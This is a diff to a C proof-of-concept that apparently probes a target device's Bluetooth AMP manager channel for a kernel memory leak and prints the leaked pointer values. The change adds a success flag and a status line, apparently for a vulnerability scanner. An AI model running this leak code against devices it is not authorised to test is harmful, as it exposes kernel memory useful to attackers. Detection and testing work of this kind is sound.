@@ -9,6 +9,7 @@
 #include <stdio.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <stdbool.h>
 
 #define AMP_MGR_CID 0x03
 
@@ -69,6 +70,8 @@ int main(int argc, char **argv) {
 
   bdaddr_t dst_addr;
   str2ba(argv[1], &dst_addr);
+
+  bool is_successful = false;
 
   printf("[*] Resetting hci0 device...\n");
   fflush(stdout);
@@ -202,6 +205,7 @@ int main(int argc, char **argv) {
         uint16_t leak3 = *(uint64_t *)(buf + 29);
         printf("[+] Leaked: %lx, %lx, %x\n", leak1, leak2, leak3);
         fflush(stdout);
+        is_successful = true;
         break;
       }
     }
@@ -209,6 +213,14 @@ int main(int argc, char **argv) {
 
   close(l2_sock);
   hci_close_dev(hci_socket);
+
+  if (is_successful) {
+    printf("SBLEEDY_GONZALES DATA: code=2, data=The device leaked information");
+    fflush(stdout);
+  } else {
+    printf("SBLEEDY_GONZALES DATA: code=1, data=The device didn't leak information");
+    fflush(stdout);
+  }
 
   return 0;
 }
